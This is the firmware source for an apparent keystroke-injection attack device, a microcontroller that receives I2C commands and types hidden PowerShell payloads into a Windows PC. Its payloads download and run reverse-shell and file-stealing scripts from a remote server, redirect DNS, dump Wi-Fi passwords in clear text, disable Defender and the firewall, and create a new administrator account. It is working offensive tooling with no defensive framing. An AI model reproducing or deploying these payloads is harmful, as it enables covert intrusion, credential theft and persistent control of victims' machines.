// slave board code
#include <Wire.h>
#include <Keyboard.h>
#include "lib/simple-instructions.h"
#include "lib/complex-instructions.h"

// Define constants
const int I2C_MASTER_ADDR = 0x08; // I2C address of the ESP32C6 (C6 board)
const int ledPin = 13;

const char *server = "ip_address";
const char *port = "port";

const char *password = "password";
const char *username = "username";

const char *dns_server1 = "192.168.0.198";
const char *dns_server2 = "1.1.1.1";

const char *admin_username = "admin_username";
const char *admin_password = "admin_password";

void setup()
{
  Wire.begin(I2C_MASTER_ADDR);  // Initialize I2C as slave
  Keyboard.begin();             // Initialize the Keyboard library
  Wire.onReceive(receiveEvent); // Register the receive event handler
  Serial.begin(115200);         // Initialize Serial for debugging
  Serial.println("SAMD21 ready to receive commands over I2C");
}

void loop() {
  // The loop is empty because all the work is done in the receiveEvent function
}

void receiveEvent(int bytes) {
  String command = "";
  while (Wire.available()) {
    char c = Wire.read();
    command += c;
  }
  Serial.println("Received command: " + command);
  executeCommand(command);
}

void executeCommand(String command)
{
  if (command == "RS")
  { // Reverse Shell
    openPowerShell();
    Serial.println(command);
    String payload = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'http://" + String(server) + "/reverse_shell.ps1' -OutFile 'C:\\Users\\Public\\reverse_shell.ps1'; Start-Job -FilePath 'C:\\Users\\Public\\reverse_shell.ps1'\"";
    Keyboard.println(payload);
  }
  else if (command == "FR")
  { // File Retriever
    openPowerShell();
    Serial.println(command);
    String payload = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-WebRequest -Uri 'http://" + String(server) + "/file_retriever.ps1' -OutFile 'C:\\Users\\Public\\file_retriever.ps1'; Start-Job -FilePath 'C:\\Users\\Public\\file_retriever.ps1'\"";
    Keyboard.println(payload);
  }
  else if (command == "DNS")
  { // Set DNS Server
    String payload = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"Set-DnsClientServerAddress -InterfaceAlias 'Wi-Fi' -ServerAddresses '" + String(dns_server1) + "', '" + String(dns_server2) + "'\"";
    killall();
    openPowerShellAdmin();
    // openPowerShell();
    Serial.println(command);
    Keyboard.println(payload);
  }
  else if (command == "Wpass")
  { // Retrieve Wi-Fi Passwords
    String payload = "powershell -NoP -NonI -W Hidden -Exec Bypass netsh wlan export profile key=clear folder=C:\\temp";
    openPowerShell();
    Serial.println(command);
    Keyboard.println(payload);
  }
  else if (command == "Ddefender")
  { // Disable Windows Defender
    String payload = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"Set-MpPreference -DisableRealtimeMonitoring $true;\"";
    killall();
    openPowerShellAdmin();
    Serial.println(command);
    Keyboard.println(payload);
  }
  else if (command == "Dfirewall")
  { // Disable Windows Firewall
    String payload = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"netsh advfirewall set allprofiles state off;\"";
    killall();
    openPowerShellAdmin();
    Serial.println(command);
    Keyboard.println(payload);
  }
  else if (command == "NewAdmin")
  { // Create a new admin user
    String payload = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"net user " + String(admin_username) + " " + String(admin_password) + " /add; net localgroup administrators " + String(admin_username) + " /add;\"";
    killall();
    openPowerShellAdmin();
    Serial.println(command);
    Keyboard.println(payload);
  }
  else if (command == "Cargo") {
    openPowerShell();
    Keyboard.println("cd C:\\");
    Keyboard.println("mkdir cargo");
    Keyboard.println("echo \"{"URL": "api.example.com", "Port": "443", "esp_id": "your_esp_id_here", "delivery_key": "your_delivery_key_here", "encryption_password": "YourEncryptionPassword"}\" > C:\\CARGO\\cred");

  }
  else if (command == "None") {
    for (int i = 0; i < 20; i++)
    {
      digitalWrite(LED_BUILTIN, HIGH);
      delay(50);
      digitalWrite(LED_BUILTIN, LOW);
      delay(50);
    }
    digitalWrite(LED_BUILTIN, LOW);
  }
  else 
  {
    Serial.println("Invalid command");
    for (int i = 0; i < 10; i++)
    {
      digitalWrite(LED_BUILTIN, HIGH);
      delay(250);
      digitalWrite(LED_BUILTIN, LOW);
      delay(250);
    }
    digitalWrite(LED_BUILTIN, LOW);
  }
  // Add more commands as needed
}

// Response function (To be implemented):
// void sendResponse(String response) {
//   Wire.beginTransmission(I2C_MASTER_ADDR);
//   Wire.write(response.c_str(), response.length());
//   Wire.endTransmission();
//   Serial.println("Sent response to ESP32C6: " + response);
// }